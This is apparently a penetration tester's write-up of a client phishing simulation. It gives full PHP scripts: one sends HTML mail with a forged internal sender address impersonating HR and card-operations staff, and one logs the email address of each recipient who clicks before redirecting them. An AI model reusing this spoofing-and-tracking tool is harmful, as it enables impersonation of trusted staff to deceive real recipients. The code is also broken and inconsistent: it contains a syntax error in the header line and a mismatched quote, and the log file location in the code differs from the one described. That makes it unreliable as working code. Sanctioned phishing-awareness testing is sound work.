# Phishing-with-spoofed-mail-id

Basic client requirement was to send the mail to a targeted list of users from a spoofed mail id (abc@clientdomain.com) which will be exactly same with the mail id of their HR and CradOperations team along with their standard signature format and mail body should contain a link which will be redirected to organization’s landing page (https://landingpage.clientdomain.com) only upon click.
Client was also interested to get the list of users clicked the link provided over the mail.


After collating client’s requirement I thought of some customized script rather than using any standard tool. Because no tool was fulfilling the entire set of requirements.
Then I developed two simple php scripts:
•	One is for triggering the mail to the target user ids (mailer.php)
•	Second one is to capture the user id from which the user is clicking the link shared over mail and write that user id in a text file (test.php)

Steps for Execution
•	In order to make the campaign successful, I have followed the below steps:
•	I set up two separate servers (s1 & s2) in 000webhost
•	Put mailer.php and test.php in s1 and one log file (UserLog.txt) in s2
•	Hit http://s1.000webhostapp.com/mailer.php in browser in order to trigger the mail to the target users
•	Continuously checked logfile in s2 (http://s2.000webhostapp.com/UserLog.php) in an interval of 15 mins

Evidences of Demonstration

mailer.php
<?php 

$contacts = array(
//put target mail ids enclosed in double quote and separated by commas from each other
"abc@domain.com",
"xyz@domain.com"

//....as many email address as you need
);

foreach($contacts as $contact) {

//define the receiver of the email 
$to      =  $contact;

//define the subject of the email 
$subject = '……’; 

$url = "http://s1.000webhostapp.com/test.php?name=" . $contact;

$message = <<<EOF
<html>
<body>
//Design the Mail body along with signature as per the requirement
</body>
</html>
EOF;

//define the headers we want passed. Note that they are separated with \r\n 

$headers = "From: CardOperations@clientdomain.com\r\n";
$headers. = "Content-type: text/html\r\n";

//send the email 
$mail_sent = mail( $to, $subject, $message, $headers ); 

//if the message is sent successfully print "Mail sent". Otherwise print "Mail failed" 
echo $mail_sent ? "Mail sent\n\n" : "Mail failed"; 
}
?>


test.php
<?php
header ('Location: https://landingpage.clientdomain.com');
$myfile = fopen("UserLog.txt", "a");
$content = $_GET["name"] . PHP_EOL;
fwrite($myfile, $content);
fclose($myfile);
echo 'User Clicked: ' . htmlspecialchars($_GET["name"]);
?>
